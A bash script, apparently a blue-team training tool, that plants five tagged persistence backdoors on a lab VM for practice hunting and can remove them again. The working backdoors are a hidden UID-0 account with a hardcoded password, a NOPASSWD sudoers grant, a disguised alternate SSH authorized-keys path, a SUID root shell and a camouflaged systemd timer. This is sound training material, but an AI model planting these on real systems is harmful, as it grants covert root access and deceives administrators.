#!/usr/bin/env bash
# walkthrough.sh - a SMALL curated set of footholds for hands-on practice.
#
# plant.sh lays sixteen artifacts at once, which is the right shape for scoring
# hunt.sh against ground truth and the wrong shape for a person learning the
# tools: by the eighth finding you are pattern-matching output rather than
# thinking. This plants five, each one landing in a different tool and a
# different card, so each finding is worth working all the way through.
#
#   sudo ./walkthrough.sh          plant, and print ground truth last
#   sudo ./walkthrough.sh --clean  remove exactly what it planted
#
# LAB ONLY. Every technique is a standard CCDC red-team move; nothing here is
# novel, and nothing reaches off the box.
set -u

MARK="RT_WALKTHROUGH"
manifest=/root/.walkthrough_manifest
acct=svc-telemetry
sudoers_file=/etc/sudoers.d/90-telemetry
ssh_dropin=/etc/ssh/sshd_config.d/45-hardening.conf
altkeys_dir=/etc/ssh/authorized_keys
suid_path=/usr/lib/x86_64-linux-gnu/gvfsd-helper
timer_name=sysstat-collect
timer_script=/usr/local/sbin/sysstat-collect

plant() { printf '  planted: %s\n' "$1"; printf '%s\n' "$1" >>"$manifest"; }
failed() { printf '  FAILED:  %s\n' "$1" >&2; }

if [ "${1:-}" = "--clean" ]; then
  echo "[*] removing walkthrough plants"
  systemctl disable --now "$timer_name.timer" >/dev/null 2>&1 || true
  rm -f "/etc/systemd/system/$timer_name.timer" "/etc/systemd/system/$timer_name.service"
  systemctl daemon-reload >/dev/null 2>&1 || true
  rm -f "$timer_script" "$sudoers_file" "$ssh_dropin" "$suid_path"
  rm -rf "$altkeys_dir"
  # NEVER -r here. This account's home is /root on purpose - that is the entire
  # point of the plant - and `userdel -r` would delete it, which is the exact
  # accident this scenario exists to teach.
  id "$acct" >/dev/null 2>&1 && userdel -f "$acct" >/dev/null 2>&1
  if [ -f /etc/sudoers.d/90-telemetry.bak ]; then rm -f /etc/sudoers.d/90-telemetry.bak; fi
  sshd -t 2>/dev/null && systemctl reload ssh >/dev/null 2>&1
  rm -f "$manifest"
  echo "[*] done"
  exit 0
fi

[ "$(id -u)" -eq 0 ] || { echo "run as root on a lab VM"; exit 1; }
: >"$manifest"
echo "[*] planting walkthrough set (all tagged $MARK)"

# 1. A second UID-0 account whose HOME IS /root.
#    This is what a UID-0 backdoor normally looks like: it is not merely
#    privileged, it lives where root lives. -M so useradd does not try to
#    create or populate the directory, -o so it will accept a duplicate UID.
if id "$acct" >/dev/null 2>&1; then
  failed "user:$acct already exists; refusing to touch an unowned account"
elif useradd -M -d /root -u 0 -o -s /bin/bash -c "telemetry collector" "$acct" 2>/dev/null \
  && printf '%s\n' "$acct:Telem3try!" | chpasswd 2>/dev/null; then
  plant "user:$acct|uid=0|home=/root"
else
  failed "user:$acct"
fi

# 2. Passwordless root for the account the SCORED SERVICE already runs as.
#    Nastier than a new account and more realistic: nothing new appears in
#    /etc/passwd, and deleting www-lab takes the scored web service with it.
if id www-lab >/dev/null 2>&1; then
  if printf '# %s\nwww-lab ALL=(ALL) NOPASSWD:ALL\n' "$MARK" >"$sudoers_file" \
    && chmod 0440 "$sudoers_file" && visudo -cf "$sudoers_file" >/dev/null 2>&1; then
    plant "sudoers:$sudoers_file|grants=www-lab NOPASSWD:ALL"
  else
    rm -f "$sudoers_file"; failed "sudoers:$sudoers_file"
  fi
else
  failed "sudoers: www-lab does not exist on this box"
fi

# 3. An alternate authorized-keys location, plus a key in it.
#    Every "check authorized_keys" habit looks at ~/.ssh/authorized_keys. This
#    moves the goalposts in sshd_config instead, so the key granting root login
#    is not in any file that habit inspects.
if [ -d /etc/ssh/sshd_config.d ]; then
  mkdir -p "$altkeys_dir" && chmod 0755 "$altkeys_dir"
  ssh-keygen -q -t ed25519 -N '' -C "$MARK" -f /tmp/.wt_key 2>/dev/null
  if [ -f /tmp/.wt_key.pub ]; then
    cat /tmp/.wt_key.pub >"$altkeys_dir/root"
    chmod 0644 "$altkeys_dir/root"
    rm -f /tmp/.wt_key /tmp/.wt_key.pub
  fi
  {
    printf '# %s\n' "$MARK"
    printf '# hardening: consolidated key management\n'
    printf 'AuthorizedKeysFile .ssh/authorized_keys %s/%%u\n' "$altkeys_dir"
  } >"$ssh_dropin"
  chmod 0644 "$ssh_dropin"
  if sshd -t 2>/dev/null; then
    systemctl reload ssh >/dev/null 2>&1 || true
    plant "ssh:$ssh_dropin|AuthorizedKeysFile -> $altkeys_dir/%u|key at $altkeys_dir/root"
  else
    rm -f "$ssh_dropin"; rm -rf "$altkeys_dir"; failed "ssh:$ssh_dropin (sshd -t refused it)"
  fi
else
  failed "ssh: no sshd_config.d on this box"
fi

# 4. A SUID root shell with a name that belongs in the directory it is in.
#    Nothing about "gvfsd-helper" under /usr/lib looks wrong. What is wrong is
#    that no package owns it and it is SUID root - which is a question you can
#    only answer by asking dpkg, not by reading the name.
if [ -x /bin/dash ] && [ -d "$(dirname "$suid_path")" ]; then
  if cp /bin/dash "$suid_path" && chown root:root "$suid_path" && chmod 4755 "$suid_path"; then
    plant "suid:$suid_path|copy of /bin/dash, mode 4755, unpackaged"
  else
    rm -f "$suid_path"; failed "suid:$suid_path"
  fi
else
  failed "suid: /bin/dash missing"
fi

# 5. A systemd timer named after something that really exists on Ubuntu.
#    sysstat IS a real package with real timers, so the name survives a glance
#    at `systemctl list-timers`. The unit file is not from any package.
{
  printf '#!/bin/sh\n# %s\n' "$MARK"
  printf '# lab payload: touches a file so the timer is observably firing.\n'
  printf 'date -u +%%FT%%TZ >>/var/tmp/.sysstat-collect.stamp 2>/dev/null\n'
  printf 'exit 0\n'
} >"$timer_script"
chmod 0755 "$timer_script"
cat >"/etc/systemd/system/$timer_name.service" <<UNIT
[Unit]
Description=Collect system activity accounting

[Service]
Type=oneshot
ExecStart=$timer_script
UNIT
cat >"/etc/systemd/system/$timer_name.timer" <<UNIT
[Unit]
Description=Run system activity accounting collection

[Timer]
OnBootSec=2min
OnUnitActiveSec=10min

[Install]
WantedBy=timers.target
UNIT
if systemctl daemon-reload >/dev/null 2>&1 \
  && systemctl enable --now "$timer_name.timer" >/dev/null 2>&1; then
  plant "timer:$timer_name.timer|ExecStart=$timer_script|unpackaged unit"
else
  failed "timer:$timer_name.timer"
fi

printf '\n[*] ground truth (%s items):\n' "$(wc -l <"$manifest")"
sed 's/^/    /' "$manifest"
printf '\n[*] clean up with: sudo %s --clean\n' "$0"
